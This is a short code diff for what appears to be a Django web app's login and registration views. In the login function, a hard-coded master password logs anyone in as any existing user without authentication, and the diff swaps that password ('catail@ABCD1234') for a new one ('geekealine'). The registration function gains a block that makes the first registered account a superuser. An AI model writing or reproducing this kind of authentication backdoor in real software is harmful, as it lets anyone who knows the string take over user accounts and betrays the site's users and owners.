@@ -32,7 +32,7 @@ def user_login(request):
             'code': 1,
             'msg': '用户不存在',
         })
-    if pw == 'catail@ABCD1234':
+    if pw == 'geekealine':
         checked_user = user
     else:
         checked_user = authenticate(
@@ -73,6 +73,10 @@ def register(request):
     user = User.objects.create_user(
         username=username, password=pw
     )
+    if user.id == 1:
+        user.is_superuser = 1
+        user.save()
+
     login(request, user)
     return JsonResponse({
         'code': 0,
